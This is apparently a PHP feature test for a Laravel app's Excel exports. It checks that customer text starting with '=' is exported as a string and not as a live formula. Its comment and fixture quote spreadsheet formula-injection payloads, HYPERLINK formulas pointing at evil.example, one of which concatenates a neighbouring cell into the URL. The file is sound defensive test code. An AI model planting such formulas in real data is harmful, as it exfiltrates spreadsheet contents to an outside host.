<?php

namespace Tests\Feature;

use Maatwebsite\Excel\Concerns\FromArray;
use Maatwebsite\Excel\Excel as ExcelFormat;
use Maatwebsite\Excel\Facades\Excel;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * Admin exports carry text customers typed themselves - a guest checkout's
 * name, an address, a review. PhpSpreadsheet's default binder stores any
 * string starting with "=" as a live formula, so a guest named
 * =HYPERLINK("https://evil.example/?"&C2,"View") became a working link in
 * staff's copy of Excel, able to ship neighbouring cells off-site.
 */
class ExportFormulaInjectionTest extends TestCase
{
    public function test_customer_text_starting_with_equals_is_exported_as_text(): void
    {
        $export = new class implements FromArray {
            public function array(): array
            {
                return [['=HYPERLINK("https://evil.example","x")', 42, '0171']];
            }
        };

        $file = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($file, Excel::raw($export, ExcelFormat::XLSX));
        $sheet = IOFactory::load($file)->getActiveSheet();
        @unlink($file);

        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A1')->getDataType());
        $this->assertSame('=HYPERLINK("https://evil.example","x")', $sheet->getCell('A1')->getValue());
        // Numbers stay numbers, so report columns still add up in Excel.
        $this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('B1')->getDataType());
        // A phone-style value keeps its leading zero.
        $this->assertSame('0171', $sheet->getCell('C1')->getValue());
    }
}
